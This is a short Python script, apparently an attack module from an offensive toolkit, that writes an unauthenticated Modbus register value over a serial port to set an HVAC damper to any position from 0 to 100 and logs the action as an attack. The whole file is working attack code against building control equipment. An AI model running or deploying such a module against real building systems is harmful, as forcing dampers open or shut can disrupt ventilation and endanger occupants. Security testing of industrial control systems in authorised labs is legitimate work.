#!/usr/bin/env python3
# modules/attacks/hvac_damper_controller.py

import minimalmodbus
import argparse
import time
import os

LOG = "results/hvac_damper_attack.log"
MODBUS_PORT = "/dev/ttyUSB0"
MODBUS_ADDR = 1
REGISTER = 100  # Damper control register

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{time.ctime()} | {msg}\n")
    print(msg)

def control_damper(position):
    try:
        instrument = minimalmodbus.Instrument(MODBUS_PORT, MODBUS_ADDR)
        instrument.serial.baudrate = 9600
        instrument.write_register(REGISTER, position)
        log(f"Set damper to position {position}")
    except Exception as e:
        log(f"[ERROR] Modbus damper control failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Control HVAC damper via Modbus")
    parser.add_argument("--position", type=int, choices=range(0, 101), default=0,
                        help="Damper position (0-100)")
    args = parser.parse_args()
    control_damper(args.position)
